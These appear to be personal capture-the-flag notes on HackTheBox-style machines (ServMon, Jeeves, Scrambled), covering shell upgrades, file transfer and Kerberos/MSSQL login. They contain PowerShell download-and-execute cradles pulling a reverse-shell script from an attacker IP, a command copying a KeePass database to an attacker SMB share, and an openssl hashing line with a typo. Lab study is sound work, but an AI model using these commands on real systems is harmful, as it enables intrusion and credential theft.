## MACHINE - SERVMON

**AT FINDING ROOT FLAG**

the machine is not responding after port forwarding it is not exposing the application which is needed to exploit the priviledge escalation - hence #skipped-machine

### MACHINE - JEEVES

- I WAS UPDATING MY SHELL TO POWERSHELL AND POWERSHELL WAS NOT WORKING IN THE CURRENT SHELL 
- SO UPGRADING IT WITH NISHANG POWERSHELL SCRIPT INVOKE-POWERSHELLTCP.PS1
- GOT THIS ERROR WHILE USING IWR
##### INTERNET EXPLORER ENGINE NOT AVAILABLE

```powershell
C:\Users\Administrator\.jenkins>powershell.exe -c "iex (iwr 'http://10.10.14.96/ps-shell.ps1')"
powershell.exe -c "iex (iwr 'http://10.10.14.96/ps-shell.ps1')"
iwr : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet 
Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again. 
At line:1 char:6
+ iex (iwr 'http://10.10.14.96/ps-shell.ps1')
+      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
    + FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestComman 
   d
```
- SOMETIMES USERBASICPARSING WILL ALSO NOT WORK 
#### SOLUTION

```POWERSHELL
powershell.exe -c  "IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.96/ps-shell.ps1')"
```

- JUST USE THE NET.WEBCLIENT CLASS 

##### FILE TRANSFER

- I WAS USING FTP TO TRANSFER THE KEEPASS DATABASE 
- **USE IMPACKET SMB SERVER** BCZ **FTP** MAY NOT WORK IN NON INTERACTIVE SHELL WHICH WE HAVE IN THIS CASE , IT REQUIRES FULL TTY SHELL 
- **FTP ALSO REQUIRES BINARY MODE** TO SHARE BINARY , OTHERWISE IT WILL CORRUPT THE DATA 

###### SOLUTION 

```shell
impacket-smbserver myshare . -username test -password test -smb2support 
```

- syntax is `impacket-smbserver sharename sharepath`

```powershell
net use \\ATTACKER_IP\share /user:USERNAME PASSWORD  
copy C:\path\Database.kdbx \\ATTACKER_IP\share\
```

###### VERIFY FILE HASH
```POWERSHELL
get-filehash path/to/file -algorithm md5
```

---


## MACHINE-SCRAMBLED

#### CONVERT PLAINTEXT PASSWORD INTO NTLM HASH

```bash
echo -n "password" | iconv -t utf16le | openssl digt md4 
```

-  verify the password encoding with `xxd`

- remember to use ccache file and use this syntax to login to mssql server when using kerberos 

![[Pasted image 20260312031643.png]]

### MSSQL COMMANDS FOR NAVIGATION

```BASH

```